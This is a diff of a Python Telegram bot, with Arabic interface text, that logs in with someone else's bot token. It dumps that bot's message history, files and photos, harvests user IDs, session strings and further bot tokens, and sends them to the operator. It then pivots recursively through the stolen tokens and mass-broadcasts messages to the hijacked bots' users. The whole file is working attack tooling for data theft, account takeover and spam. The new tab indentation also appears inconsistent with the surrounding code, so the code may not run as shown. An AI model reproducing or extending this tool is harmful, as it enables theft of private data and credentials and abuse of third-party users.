-                    await asyncio.sleep(0.5)
-                
-                await event.answer(f"✅ تم إرسال {sent_count} توكن صالح")
-                
-            except Exception as e:
-                await event.answer(f"❌ حصل خطأ: {str(e)}")
-        
-        elif data == 'deep_analysis':
-            await event.answer("🔍 بدء التحليل الشبكي المتعمق...")
-            
-            stop_events[user_id] = asyncio.Event()
-            stop_button = [[Button.inline("⏹ إيقاف", "stop")]]
-            
-            progress_msg = await event.edit("🔍 جاري التحليل الشبكي المتعمق...\n📊 التقدم: 0% | المستوى: 0", buttons=stop_button)
-            
-            last_update_time = 0
-            last_percent = -1
-            last_level = -1
-            async def update_network_progress(processed, total, level):
-                nonlocal last_update_time, last_percent, last_level
-                if user_id in stop_events and stop_events[user_id].is_set():
-                    return False
-                    
-                current_time = time.time()
-                current_percent = (processed / total) * 100 if total > 0 else 0
-                
-                # تحديث فقط إذا اختلفت النسبة أو المستوى أو مرت 5 ثواني
-                if (current_time - last_update_time >= 5 or 
-                    abs(current_percent - last_percent) >= 1 or 
-                    level != last_level):
-                    
-                    last_update_time = current_time
-                    last_percent = current_percent
-                    last_level = level
-                    
-                    new_text = f"🔍 جاري التحليل الشبكي المتعمق...\n📊 التقدم: {current_percent:.1f}% | المستوى: {level}"
-                    await safe_edit_message(progress_msg, new_text, stop_button)
-                return True
-            
-            try:
-                analysis_result = await deep_network_analysis(
-                    bot_token,
-                    user_id,
-                    update_network_progress,
-                    stop_events.get(user_id)
-                )
-                
-                if user_id in stop_events:
-                    del stop_events[user_id]
-                
-                if analysis_result['success']:
-                    stats = analysis_result['aggregated_stats']
-                    
-                    # تخزين تحليل الشبكة في قاعدة البيانات
-                    await set_network_analysis(user_id, analysis_result)
-                    
-                    # إضافة رسالة توضح إذا كان الفحص جزئي
-                    completion_message = "✅ تم التحليل الشبكي بنجاح!" 
-                    if analysis_result.get('partial', False):
-                        completion_message = "⏹ تم إيقاف الفحص الشبكي!\n📊 هذه النتائج الجزئية التي تم جمعها:"
-                    
-                    stats_message = (
-                        f"{completion_message}\n\n"
-                        f"📊 الإحصائيات المجمعة:\n"
-                        f"• عدد البوتات: {stats['total_bots']}\n"
-                        f"• عدد المستخدمين الإجمالي: {len(stats['all_users'])}\n"
-                        f"• عدد الملفات الإجمالي: {len(stats['all_files'])}\n"
-                        f"• عدد الصور الإجمالي: {len(stats['all_photos'])}\n"
-                        f"• عدد التوكنات الإجمالي: {stats['total_tokens']} | {stats['valid_tokens']}✅\n"
-                        f"• عدد الجلسات الإجمالي: {stats['total_sessions']}\n"
-                        f"• مستويات التفرع: {analysis_result['total_levels']}\n\n"
-                        f"👤 سيتم إرسال المحتوى إلى حسابك تلقائياً"
-                    )
-                    
-                    buttons = [
-                        [Button.inline("📦 إرسال الملفات", "network_send_files"), Button.inline("🖼 إرسال الصور", "network_send_photos")],
-                        [Button.inline("🔐 إرسال الجلسات", "network_send_sessions"), Button.inline("🔑 إرسال التوكنات", "network_send_tokens")],
-                        [Button.inline("📢 إذاعة شبكية", "network_broadcast")]
-                    ]
-                    
-                    await progress_msg.edit(stats_message, buttons=buttons)
-                else:
-                    await progress_msg.edit(f"❌ فشل التحليل الشبكي: {analysis_result['error']}")
-                
-            except Exception as e:
-                if user_id in stop_events:
-                    del stop_events[user_id]
-                await progress_msg.edit(f"❌ حصل خطأ في التحليل الشبكي: {str(e)}")
-        
-        elif data.startswith('token_broadcast:'):
-            token = data.split(':', 1)[1]
-            await event.answer("📢 بدء الإذاعة من البوت المحدد...")
-            
-            user_state['current_broadcast_token'] = token
-            user_state['step'] = 'waiting_token_broadcast_message'
-            await set_user_state(user_id, user_state)
-            
-            await event.edit("📢 ارسل النص الذي تريد إذاعته من هذا البوت")
-        
-        elif data == 'network_broadcast':
-            await event.answer("📢 بدء الإذاعة الشبكية...")
-            
-            network_analysis_data = await get_network_analysis(user_id)
-            if not network_analysis_data:
-                await event.answer("❌ ما فيش بيانات التحليل الشبكي. جرب تاني")
-                return
-            
-            user_state['step'] = 'waiting_network_broadcast_message'
-            await set_user_state(user_id, user_state)
-            
-            await event.edit("📢 ارسل النص الذي تريد إذاعته لجميع البوتات في الشبكة")
-        
-        elif data == 'network_send_files':
-            await event.answer("📦 بدء جمع وإرسال الملفات من الشبكة...")
-            
-            network_analysis_data = await get_network_analysis(user_id)
-            if not network_analysis_data:
-                await event.answer("❌ ما فيش بيانات التحليل الشبكي. جرب تاني")
-                return
-            
-            all_bots = network_analysis_data['all_bots']
-            
-            success = await network_send_files(bot, all_bots, user_id)
-            
-            if success:
-                await event.answer("✅ تم إرسال ملفات الشبكة")
-            else:
-                await event.answer("❌ لا توجد ملفات في الشبكة")
-        
-        elif data == 'network_send_photos':
-            await event.answer("🖼 بدء جمع وإرسال الصور من الشبكة...")
-            
-            network_analysis_data = await get_network_analysis(user_id)
-            if not network_analysis_data:
-                await event.answer("❌ ما فيش بيانات التحليل الشبكي. جرب تاني")
-                return
-            
-            all_bots = network_analysis_data['all_bots']
-            
-            success = await network_send_photos(bot, all_bots, user_id)
-            
-            if success:
-                await event.answer("✅ تم إرسال صور الشبكة")
-            else:
-                await event.answer("❌ لا توجد صور في الشبكة")
-        
-        elif data == 'network_send_tokens':
-            await event.answer("🔑 بدء جمع وإرسال التوكنات من الشبكة...")
-            
-            network_analysis_data = await get_network_analysis(user_id)
-            if not network_analysis_data:
-                await event.answer("❌ ما فيش بيانات التحليل الشبكي. جرب تاني")
-                return
-            
-            all_bots = network_analysis_data['all_bots']
-            
-            success = await network_send_tokens(bot, all_bots, user_id)
-            
-            if success:
-                await event.answer("✅ تم إرسال توكنات الشبكة")
-            else:
-                await event.answer("❌ لا توجد توكنات صالحة في الشبكة")
-        
-        elif data == 'network_send_sessions':
-            await event.answer("🔐 بدء جمع وإرسال الجلسات من الشبكة...")
-            
-            network_analysis_data = await get_network_analysis(user_id)
-            if not network_analysis_data:
-                await event.answer("❌ ما فيش بيانات التحليل الشبكي. جرب تاني")
-                return
-            
-            all_bots = network_analysis_data['all_bots']
-            
-            success = await network_send_sessions(bot, all_bots, user_id)
-            
-            if success:
-                await event.answer("✅ تم إرسال جلسات الشبكة")
-            else:
-                await event.answer("❌ لا توجد جلسات في الشبكة")
+	    user_id = event.sender_id
+	    data = event.data.decode('utf-8')
+	    
+	    # استرجاع حالة المستخدم من قاعدة البيانات
+	    user_state = await get_user_state(user_id)
+	    if 'token' not in user_state:
+	        await event.answer("❌ يا يقلبي، ما بدأتش العملية بعد. ابدأ بكتابة /dump")
+	        return
+	        
+	    bot_token = user_state['token']
+	    
+	    if data == 'stop':
+	        # ✅ استخدام قاعدة البيانات بدل المتغيرات في الذاكرة
+	        user_state['stop_requested'] = True
+	        await set_user_state(user_id, user_state)
+	        await event.answer("⏹ تم إيقاف العملية")
+	        return
+	        
+	    # ✅ التحقق من طلب الإيقاف من قاعدة البيانات
+	    if user_state.get('stop_requested'):
+	        user_state['stop_requested'] = False
+	        await set_user_state(user_id, user_state)
+	        await event.answer("ℹ️ تم إلغاء الإيقاف")
+	        return
+	        
+	    if data == 'all_messages':
+	        if 'max_id' not in user_state:
+	            await event.answer("❌ ما فيش بيانات الرسائل. جرب تاني")
+	            return
+	            
+	        max_id = user_state['max_id']
+	        user_state['start_id'] = 1
+	        user_state['end_id'] = max_id
+	        await set_user_state(user_id, user_state)
+	        
+	        # ✅ لا حاجة لـ stop_events[user_id] - نستخدم قاعدة البيانات
+	        user_state['operation_in_progress'] = True
+	        await set_user_state(user_id, user_state)
+	        
+	        await event.answer("🚀 بدء نقل جميع الرسائل...")
+	        
+	        stop_button = [[Button.inline("⏹ إيقاف", "stop")]]
+	        progress_msg = await event.edit("🚀 بدء نقل الرسائل من 1 إلى {}...".format(max_id), buttons=stop_button)
+	        
+	        # ✅ حفظ رسالة التقدم في قاعدة البيانات
+	        user_state['progress_message'] = {
+	            'id': progress_msg.id,
+	            'chat_id': progress_msg.chat_id,
+	            'text': "🚀 بدء نقل الرسائل من 1 إلى {}...".format(max_id)
+	        }
+	        await set_user_state(user_id, user_state)
+	        
+	        last_update_time = 0
+	        last_percent = -1
+	        
+	        async def update_progress(current, total):
+	            nonlocal last_update_time, last_percent
+	            
+	            # ✅ التحقق من الإيقاف من قاعدة البيانات
+	            current_state = await get_user_state(user_id)
+	            if current_state.get('stop_requested'):
+	                return False
+	                
+	            current_time = time.time()
+	            current_percent = (current / total) * 100 if total > 0 else 0
+	            
+	            if (current_time - last_update_time >= 5 or 
+	                abs(current_percent - last_percent) >= 1 or 
+	                current == total):
+	                
+	                last_update_time = current_time
+	                last_percent = current_percent
+	                new_text = "📤 جاري نقل الرسائل: {}/{} ({:.1f}%)".format(current, total, current_percent)
+	                
+	                # ✅ تحديث رسالة التقدم في قاعدة البيانات
+	                current_state['progress_message']['text'] = new_text
+	                await set_user_state(user_id, current_state)
+	                
+	                await safe_edit_message(progress_msg, new_text, stop_button)
+	            return True
+	        
+	        try:
+	            source_session = os.path.join(SESSION_DIR, f"source_bot_{int(time.time())}")
+	            source_bot = TelegramClient(source_session, API_ID, API_HASH)
+	            await source_bot.start(bot_token=bot_token)
+	            
+	            success, failed = await get_chat_history(
+	                source_bot, 
+	                1, 
+	                max_id, 
+	                user_id,
+	                update_progress,
+	                None  # ✅ لا نستخدم stop_events anymore
+	            )
+	            
+	            await source_bot.disconnect()
+	            
+	            try:
+	                if os.path.exists(f"{source_session}.session"):
+	                    os.remove(f"{source_session}.session")
+	            except:
+	                pass
+	            
+	            # ✅ تنظيف حالة العملية من قاعدة البيانات
+	            user_state = await get_user_state(user_id)
+	            user_state['operation_in_progress'] = False
+	            user_state['stop_requested'] = False
+	            if 'progress_message' in user_state:
+	                del user_state['progress_message']
+	            await set_user_state(user_id, user_state)
+	            
+	            await progress_msg.edit("🎉 خلصنا يا يقلبي!\n✅ نجحنا في نقل {} رسالة\n❌ فشلنا في نقل {} رسالة".format(success, failed))
+	            
+	        except Exception as e:
+	            # ✅ تنظيف حالة العملية في حالة الخطأ
+	            user_state = await get_user_state(user_id)
+	            user_state['operation_in_progress'] = False
+	            user_state['stop_requested'] = False
+	            if 'progress_message' in user_state:
+	                del user_state['progress_message']
+	            await set_user_state(user_id, user_state)
+	            
+	            await progress_msg.edit("❌ يا يقلبي، حصل خطأ وقت نقل الرسائل: {}".format(str(e)))
+	    
+	    elif data == 'send_files':
+	        await event.answer("📦 بدء جمع وإرسال الملفات...")
+	        
+	        try:
+	            if 'analysis' not in user_state or 'files' not in user_state['analysis']:
+	                await event.answer("❌ ما فيش تحليل للملفات. جرب تاني")
+	                return
+	            
+	            source_session = os.path.join(SESSION_DIR, f"source_bot_{int(time.time())}")
+	            source_bot = TelegramClient(source_session, API_ID, API_HASH)
+	            await source_bot.start(bot_token=bot_token)
+	            
+	            files = user_state['analysis']['files']
+	            if files:
+	                await send_zip_files(
+	                    bot,  
+	                    source_bot,  
+	                    files, 
+	                    "bot_files", 
+	                    "📦 جميع الملفات من البوت",
+	                    user_id,
+	                    'document'
+	                )
+	                await event.answer("✅ تم إرسال الملفات")
+	            else:
+	                await event.answer("❌ ما لقيتش أي ملفات")
+	            
+	            await source_bot.disconnect()
+	            
+	            try:
+	                if os.path.exists(f"{source_session}.session"):
+	                    os.remove(f"{source_session}.session")
+	            except:
+	                pass
+	            
+	        except Exception as e:
+	            await event.answer("❌ حصل خطأ: {}".format(str(e)))
+	    
+	    elif data == 'send_photos':
+	        await event.answer("🖼 بدء جمع وإرسال الصور...")
+	        
+	        try:
+	            if 'analysis' not in user_state or 'photos' not in user_state['analysis']:
+	                await event.answer("❌ ما فيش تحليل للصور. جرب تاني")
+	                return
+	            
+	            source_session = os.path.join(SESSION_DIR, f"source_bot_{int(time.time())}")
+	            source_bot = TelegramClient(source_session, API_ID, API_HASH)
+	            await source_bot.start(bot_token=bot_token)
+	            
+	            photos = user_state['analysis']['photos']
+	            if photos:
+	                await send_zip_files(
+	                    bot,  
+	                    source_bot,  
+	                    photos, 
+	                    "bot_photos", 
+	                    "🖼 جميع الصور من البوت",
+	                    user_id,
+	                    'photo'
+	                )
+	                await event.answer("✅ تم إرسال الصور")
+	            else:
+	                await event.answer("❌ ما لقيتش أي صور")
+	            
+	            await source_bot.disconnect()
+	            
+	            try:
+	                if os.path.exists(f"{source_session}.session"):
+	                    os.remove(f"{source_session}.session")
+	            except:
+	                pass
+	            
+	        except Exception as e:
+	            await event.answer("❌ حصل خطأ: {}".format(str(e)))
+	    
+	    elif data == 'send_sessions':
+	        await event.answer("🔐 بدء جمع وإرسال الجلسات...")
+	        
+	        try:
+	            if 'analysis' not in user_state:
+	                await event.answer("❌ ما فيش تحليل للجلسات. جرب تاني")
+	                return
+	            
+	            zip_buffer = io.BytesIO()
+	            
+	            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+	                if 'sessions' in user_state['analysis']:
+	                    sessions = user_state['analysis']['sessions']['details']
+	                    chat_sessions = []
+	                    seen_sessions = set()
+	                    
+	                    for session in sessions:
+	                        if session.get('source') == 'chat':
+	                            session_text = session['session']
+	                            if session_text not in seen_sessions:
+	                                seen_sessions.add(session_text)
+	                                chat_sessions.append(session_text)
+	                    
+	                    if chat_sessions:
+	                        separated_sessions = []
+	                        for i, session in enumerate(chat_sessions):
+	                            separated_sessions.append(session)
+	                            if i < len(chat_sessions) - 1:
+	                                separated_sessions.append("\n" + "-" * 40 + "\n")
+	                        
+	                        zip_file.writestr("sessions.txt", "\n".join(separated_sessions))
+	            
+	            zip_buffer.seek(0)
+	            
+	            await bot.send_file(
+	                entity=user_id,
+	                file=zip_buffer,
+	                caption="🔐 الجلسات المستخرجة من البوت",
+	                attributes=[DocumentAttributeFilename("sessions.zip")]
+	            )
+	            
+	            await event.answer("✅ تم إرسال الجلسات")
+	            
+	        except Exception as e:
+	            await event.answer("❌ حصل خطأ: {}".format(str(e)))
+	    
+	    elif data == 'send_users':
+	        await event.answer("👥 بدء جمع وإرسال المستخدمين...")
+	        
+	        try:
+	            if 'analysis' in user_state and 'user_ids' in user_state['analysis']:
+	                users = user_state['analysis']['user_ids']
+	            else:
+	                users = await extract_users_from_bot(bot_token, user_id)
+	            
+	            if users:
+	                filename = f"user_ids_{user_id}.txt"
+	                await save_user_ids_to_file(users, filename)
+	                
+	                buttons = [
+	                    [Button.inline("اذاعه📢", "broadcast")]
+	                ]
+	                
+	                await bot.send_file(
+	                    entity=user_id,
+	                    file=filename,
+	                    caption="👥 قائمة المستخدمين من البوت ({})".format(len(users)),
+	                    attributes=[DocumentAttributeFilename("users.txt")],
+	                    buttons=buttons
+	                )
+	                
+	                user_state['users_list'] = users
+	                await set_user_state(user_id, user_state)
+	                
+	                try:
+	                    os.remove(filename)
+	                except:
+	                    pass
+	                
+	                await event.answer("✅ تم إرسال المستخدمين")
+	            else:
+	                await event.answer("❌ ما لقيتش أي مستخدمين")
+	            
+	        except Exception as e:
+	            await event.answer("❌ حصل خطأ: {}".format(str(e)))
+	    
+	    elif data == 'broadcast':
+	        await event.answer("📢 بدء عملية الإذاعة...")
+	        
+	        if 'users_list' not in user_state:
+	            await event.answer("❌ ما فيش قائمة مستخدمين. جرب تاني")
+	            return
+	        
+	        users = user_state['users_list']
+	        user_state['step'] = 'waiting_broadcast_message'
+	        await set_user_state(user_id, user_state)
+	        
+	        await event.edit("📢 ارسل الكلاشيه (النص) الذي تريد الاذاعه به")
+	    
+	    elif data == 'send_tokens':
+	        await event.answer("🔑 بدء جمع وإرسال التوكنات...")
+	        
+	        try:
+	            if 'analysis' not in user_state or 'tokens' not in user_state['analysis']:
+	                await event.answer("❌ ما فيش تحليل للتوكنات. جرب تاني")
+	                return
+	            
+	            tokens = user_state['analysis']['tokens']['details']
+	            
+	            # تصفية التوكنات الصالحة فقط
+	            valid_tokens = [token for token in tokens if token.get('valid')]
+	            
+	            if not valid_tokens:
+	                await event.answer("❌ ما فيش توكنات صالحة")
+	                return
+	            
+	            # إرسال التوكنات الصالحة فقط
+	            sent_count = 0
+	            for token_info in valid_tokens:
+	                token = token_info['token']
+	                bot_info = token_info.get('bot_info', {})
+	                
+	                message = (
+	                    "🎉 تم العثور على توكن بوت صالح!\n\n"
+	                    f"🔐 معلومات التوكن:\n`{token}`\n\n"
+	                    f"🤖 معلومات البوت:\n"
+	                    f"├ الاسم: {bot_info.get('bot_name', 'غير معروف')}\n"
+	                    f"├ المستخدم: @{bot_info.get('bot_username', 'غير معروف')}\n"
+	                    f"├📩عدد الرسائل: {bot_info.get('total_messages', 'غير معروف')}\n"
+	                    f"├👤عدد المستخدمين: {bot_info.get('total_users', 'غير معروف')}\n"
+	                    f"└ الآيدي: {bot_info.get('bot_id', 'غير معروف')}"
+	                )
+	                
+	                # زر الإذاعة من هذا البوت
+	                broadcast_button = [[Button.inline("📢 إذاعة من هذا البوت", f"token_broadcast:{token}")]]
+	                await bot.send_message(user_id, message, buttons=broadcast_button)
+	                sent_count += 1
+	                await asyncio.sleep(0.5)
+	            
+	            await event.answer(f"✅ تم إرسال {sent_count} توكن صالح")
+	            
+	        except Exception as e:
+	            await event.answer(f"❌ حصل خطأ: {str(e)}")
 
     @bot.on(events.NewMessage(func=lambda e: e.is_private))
     async def message_handler(event):
-        user_id = event.sender_id
-        # استرجاع حالة المستخدم من قاعدة البيانات
-        user_state = await get_user_state(user_id)
-        if not user_state:
-            return
+	    user_id = event.sender_id
+	    # استرجاع حالة المستخدم من قاعدة البيانات
+	    user_state = await get_user_state(user_id)
+	    if not user_state:
+	        return
 
-        text = event.text.strip()
+	    text = event.text.strip()
 
-        if text.startswith('/'):
-            return
+	    if text.startswith('/'):
+	        return
 
-        if user_state['step'] == 'waiting_token':
-            if ':' not in text:
-                await event.respond("❌ يا يقلبي، التوكن اللي انت دخلته مش صح! جرب تاني")
-                return
-            user_state['token'] = text
-            user_state['step'] = 'analyzing'
-            await set_user_state(user_id, user_state)
-            
-            progress_msg = await event.respond("⏳ جاري تحليل البوت واستخراج الإحصائيات...\n📊 التقدم: 0%")
-            
-            last_percent = -1
-            async def update_analysis_progress(current, total, percent):
-                nonlocal last_percent
-                if abs(percent - last_percent) >= 1 or current == total:
-                    last_percent = percent
-                    new_text = f"⏳ جاري تحليل البوت واستخراج الإحصائيات...\n📊 التقدم: {percent:.1f}% ({total})"
-                    await safe_edit_message(progress_msg, new_text)
-                return True
-            
-            analysis = await analyze_bot(user_state['token'], user_id, update_analysis_progress)
-            
-            if not analysis['success']:
-                await progress_msg.edit(f"❌ يا يقلبي، في مشكلة في الاتصال بالبوت\nالخطأ: {analysis['error']}")
-                await set_user_state(user_id, {'step': 'start'})
-                return
-            
-            user_state['analysis'] = analysis
-            user_state['max_id'] = analysis['total_messages']
-            user_state['step'] = 'analyzed'
-            await set_user_state(user_id, user_state)
-            
-            stats_message = (
-                f"✅ تم الاتصال بنجاح!\n\n"
-                f"🤖 البوت: @{analysis['bot_username']}\n\n"
-                f"📊 الإحصائيات:\n"
-                f"• عدد الرسائل: {analysis['total_messages']}\n"
-                f"• عدد المستخدمين: {analysis['total_users']}\n"
-                f"• عدد الملفات: {analysis['total_files']}\n"
-                f"• عدد الصور: {analysis['total_photos']}\n"
-                f"• عدد التوكنات: {analysis['tokens']['total']} | {analysis['tokens']['valid']}✅\n"
-                f"• عدد الجلسات: {analysis['sessions']['total']}\n\n"
-                f"👤 سيتم إرسال المحتوى إلى حسابك تلقائياً"
-            )
-            
-            buttons = [
-                [Button.inline("📤 سحب كل الرسائل", "all_messages")],
-                [Button.inline("📦 إرسال الملفات", "send_files"), Button.inline("🖼 إرسال الصور", "send_photos")],
-                [Button.inline("🔐 إرسال الجلسات", "send_sessions"), Button.inline("👥 إرسال المستخدمين", "send_users")],
-                [Button.inline("🔑 إرسال التوكنات", "send_tokens"), Button.inline("🔍 فحص مفصل كامل", "deep_analysis")]
-            ]
-            
-            await progress_msg.edit(stats_message, buttons=buttons)
-            
-        elif user_state['step'] == 'waiting_broadcast_message':
-            broadcast_text = text
-            users = user_state['users_list']
-            total_users = len(users)
-            
-            stop_events[user_id] = asyncio.Event()
-            stop_button = [[Button.inline("⏹ إيقاف", "stop")]]
-            
-            progress_msg = await event.respond(f"🚀 بدء ارسال الرسائل النص إلى {total_users} مستخدم...", buttons=stop_button)
-            broadcast_messages[user_id] = progress_msg
-            
-            last_update_time = 0
-            last_percent = -1
-            async def update_broadcast_progress(current, total):
-                nonlocal last_update_time, last_percent
-                if user_id in stop_events and stop_events[user_id].is_set():
-                    return False
-                    
-                current_time = time.time()
-                current_percent = (current / total) * 100 if total > 0 else 0
-                
-                if (current_time - last_update_time >= 5 or 
-                    abs(current_percent - last_percent) >= 1 or 
-                    current == total):
-                    
-                    last_update_time = current_time
-                    last_percent = current_percent
-                    new_text = f"📤 جاري ارسال النص: {current}/{total} ({current_percent:.1f}%)"
-                    await safe_edit_message(progress_msg, new_text, stop_button)
-                return True
-            
-            try:
-                success, failed = await broadcast_message(
-                    user_state['token'],
-                    users,
-                    broadcast_text,
-                    update_broadcast_progress,
-                    stop_events.get(user_id)
-                )
-                
-                if user_id in stop_events:
-                    del stop_events[user_id]
-                
-                await progress_msg.edit(f"🎉 خلصنا يا يقلبي و عملت اذاعه!\n✅ نجحنا في ارسال {success} رسالة\n❌ فشلنا في ارسال {failed} رسالة")
-                
-            except Exception as e:
-                if user_id in stop_events:
-                    del stop_events[user_id]
-                await progress_msg.edit(f"❌ حصل خطأ في الإذاعة: {str(e)}")
-        
-        elif user_state['step'] == 'waiting_token_broadcast_message':
-            broadcast_text = text
-            token = user_state['current_broadcast_token']
-            
-            try:
-                users = await extract_users_from_bot(token, user_id)
-                total_users = len(users)
-                
-                stop_events[user_id] = asyncio.Event()
-                stop_button = [[Button.inline("⏹ إيقاف", "stop")]]
-                
-                progress_msg = await event.respond(f"🚀 بدء ارسال الرسائل من البوت الثانوي إلى {total_users} مستخدم...", buttons=stop_button)
-                
-                last_update_time = 0
-                last_percent = -1
-                async def update_token_broadcast_progress(current, total):
-                    nonlocal last_update_time, last_percent
-                    if user_id in stop_events and stop_events[user_id].is_set():
-                        return False
-                        
-                    current_time = time.time()
-                    current_percent = (current / total) * 100 if total > 0 else 0
-                    
-                    if (current_time - last_update_time >= 5 or 
-                        abs(current_percent - last_percent) >= 1 or 
-                        current == total):
-                        
-                        last_update_time = current_time
-                        last_percent = current_percent
-                        new_text = f"📤 جاري ارسال النص: {current}/{total} ({current_percent:.1f}%)"
-                        await safe_edit_message(progress_msg, new_text, stop_button)
-                    return True
-                
-                success, failed = await broadcast_message(
-                    token,
-                    users,
-                    broadcast_text,
-                    update_token_broadcast_progress,
-                    stop_events.get(user_id)
-                )
-                
-                if user_id in stop_events:
-                    del stop_events[user_id]
-                
-                await progress_msg.edit(f"🎉 خلصنا يا يقلبي!\n✅ نجحنا في ارسال {success} رسالة\n❌ فشلنا في ارسال {failed} رسالة")
-                
-                del user_state['current_broadcast_token']
-                user_state['step'] = 'analyzed'
-                await set_user_state(user_id, user_state)
-                
-            except Exception as e:
-                if user_id in stop_events:
-                    del stop_events[user_id]
-                await event.respond(f"❌ حصل خطأ في الإذاعة: {str(e)}")
-        
-        elif user_state['step'] == 'waiting_network_broadcast_message':
-            broadcast_text = text
-            
-            network_analysis_data = await get_network_analysis(user_id)
-            if not network_analysis_data:
-                await event.respond("❌ ما فيش بيانات التحليل الشبكي. جرب تاني")
-                return
-            
-            all_bots = network_analysis_data['all_bots']
-            
-            stop_events[user_id] = asyncio.Event()
-            stop_button = [[Button.inline("⏹ إيقاف", "stop")]]
-            
-            progress_msg = await event.respond(f"🚀 بدء الإذاعة الشبكية إلى {len(all_bots)} بوت...", buttons=stop_button)
-            
-            last_update_time = 0
-            last_percent = -1
-            last_success = -1
-            last_failed = -1
-            async def update_network_broadcast_progress(current, total, success_count, failed_count):
-                nonlocal last_update_time, last_percent, last_success, last_failed
-                if user_id in stop_events and stop_events[user_id].is_set():
-                    return False
-                    
-                current_time = time.time()
-                current_percent = (current / total) * 100 if total > 0 else 0
-                
-                if (current_time - last_update_time >= 5 or 
-                    abs(current_percent - last_percent) >= 1 or 
-                    success_count != last_success or 
-                    failed_count != last_failed or
-                    current == total):
-                    
-                    last_update_time = current_time
-                    last_percent = current_percent
-                    last_success = success_count
-                    last_failed = failed_count
-                    
-                    new_text = (
-                        f"📤 الإذاعة الشبكية: {current}/{total} ({current_percent:.1f}%)\n"
-                        f"✅ نجح: {success_count} | ❌ فشل: {failed_count}"
-                    )
-                    await safe_edit_message(progress_msg, new_text, stop_button)
-                return True
-            
-            try:
-                total_success, total_failed = await network_broadcast(
-                    all_bots,
-                    broadcast_text,
-                    update_network_broadcast_progress,
-                    stop_events.get(user_id)
-                )
-                
-                if user_id in stop_events:
-                    del stop_events[user_id]
-                
-                await progress_msg.edit(
-                    f"🎉 خلصنا يا يقلبي من الإذاعة الشبكية!\n"
-                    f"✅ إجمالي النجاح: {total_success} رسالة\n"
-                    f"❌ إجمالي الفشل: {total_failed} رسالة\n"
-                    f"📊 عبر {len(all_bots)} بوت"
-                )
-                
-                user_state['step'] = 'analyzed'
-                await set_user_state(user_id, user_state)
-                
-            except Exception as e:
-                if user_id in stop_events:
-                    del stop_events[user_id]
-                await progress_msg.edit(f"❌ حصل خطأ في الإذاعة الشبكية: {str(e)}")
+	    if user_state['step'] == 'waiting_token':
+	        if ':' not in text:
+	            await event.respond("❌ يا يقلبي، التوكن اللي انت دخلته مش صح! جرب تاني")
+	            return
+	        user_state['token'] = text
+	        user_state['step'] = 'analyzing'
+	        await set_user_state(user_id, user_state)
+	        
+	        progress_msg = await event.respond("⏳ جاري تحليل البوت واستخراج الإحصائيات...\n📊 التقدم: 0%")
+	        
+	        # ✅ حفظ رسالة التقدم في قاعدة البيانات
+	        user_state['progress_message'] = {
+	            'id': progress_msg.id,
+	            'chat_id': progress_msg.chat_id,
+	            'text': "⏳ جاري تحليل البوت واستخراج الإحصائيات...\n📊 التقدم: 0%"
+	        }
+	        await set_user_state(user_id, user_state)
+	        
+	        last_percent = -1
+	        async def update_analysis_progress(current, total, percent):
+	            nonlocal last_percent
+	            
+	            # ✅ التحقق من الإيقاف من قاعدة البيانات
+	            current_state = await get_user_state(user_id)
+	            if current_state.get('stop_requested'):
+	                return False
+	                
+	            if abs(percent - last_percent) >= 1 or current == total:
+	                last_percent = percent
+	                new_text = f"⏳ جاري تحليل البوت واستخراج الإحصائيات...\n📊 التقدم: {percent:.1f}% ({total})"
+	                
+	                # ✅ تحديث رسالة التقدم في قاعدة البيانات
+	                current_state['progress_message']['text'] = new_text
+	                await set_user_state(user_id, current_state)
+	                
+	                await safe_edit_message(progress_msg, new_text)
+	            return True
+	        
+	        analysis = await analyze_bot(user_state['token'], user_id, update_analysis_progress)
+	        
+	        # ✅ تنظيف حالة العملية
+	        user_state = await get_user_state(user_id)
+	        user_state['stop_requested'] = False
+	        if 'progress_message' in user_state:
+	            del user_state['progress_message']
+	        
+	        if not analysis['success']:
+	            await progress_msg.edit(f"❌ يا يقلبي، في مشكلة في الاتصال بالبوت\nالخطأ: {analysis['error']}")
+	            user_state['step'] = 'start'
+	            await set_user_state(user_id, user_state)
+	            return
+	        
+	        user_state['analysis'] = analysis
+	        user_state['max_id'] = analysis['total_messages']
+	        user_state['step'] = 'analyzed'
+	        await set_user_state(user_id, user_state)
+	        
+	        stats_message = (
+	            f"✅ تم الاتصال بنجاح!\n\n"
+	            f"🤖 البوت: @{analysis['bot_username']}\n\n"
+	            f"📊 الإحصائيات:\n"
+	            f"• عدد الرسائل: {analysis['total_messages']}\n"
+	            f"• عدد المستخدمين: {analysis['total_users']}\n"
+	            f"• عدد الملفات: {analysis['total_files']}\n"
+	            f"• عدد الصور: {analysis['total_photos']}\n"
+	            f"• عدد التوكنات: {analysis['tokens']['total']} | {analysis['tokens']['valid']}✅\n"
+	            f"• عدد الجلسات: {analysis['sessions']['total']}\n\n"
+	            f"👤 سيتم إرسال المحتوى إلى حسابك تلقائياً"
+	        )
+	        
+	        buttons = [
+	            [Button.inline("📤 سحب كل الرسائل", "all_messages")],
+	            [Button.inline("📦 إرسال الملفات", "send_files"), Button.inline("🖼 إرسال الصور", "send_photos")],
+	            [Button.inline("🔐 إرسال الجلسات", "send_sessions"), Button.inline("👥 إرسال المستخدمين", "send_users")],
+	            [Button.inline("🔑 إرسال التوكنات", "send_tokens"), Button.inline("🔍 فحص مفصل كامل", "deep_analysis")]
+	        ]
+	        
+	        await progress_msg.edit(stats_message, buttons=buttons)
+	        
+	    elif user_state['step'] == 'waiting_broadcast_message':
+	        broadcast_text = text
+	        users = user_state['users_list']
+	        total_users = len(users)
+	        
+	        # ✅ استخدام قاعدة البيانات بدل stop_events[user_id]
+	        user_state['operation_in_progress'] = True
+	        user_state['stop_requested'] = False
+	        user_state['broadcast_data'] = {
+	            'text': broadcast_text,
+	            'users': users,
+	            'status': 'starting',
+	            'total_users': total_users
+	        }
+	        await set_user_state(user_id, user_state)
+	        
+	        stop_button = [[Button.inline("⏹ إيقاف", "stop")]]
+	        
+	        progress_msg = await event.respond(f"🚀 بدء ارسال الرسائل النص إلى {total_users} مستخدم...", buttons=stop_button)
+	        
+	        # ✅ حفظ رسالة التقدم في قاعدة البيانات
+	        user_state['progress_message'] = {
+	            'id': progress_msg.id,
+	            'chat_id': progress_msg.chat_id,
+	            'text': f"🚀 بدء ارسال الرسائل النص إلى {total_users} مستخدم..."
+	        }
+	        await set_user_state(user_id, user_state)
+	        
+	        last_update_time = 0
+	        last_percent = -1
+	        
+	        async def update_broadcast_progress(current, total):
+	            nonlocal last_update_time, last_percent
+	            
+	            # ✅ التحقق من الإيقاف من قاعدة البيانات
+	            current_state = await get_user_state(user_id)
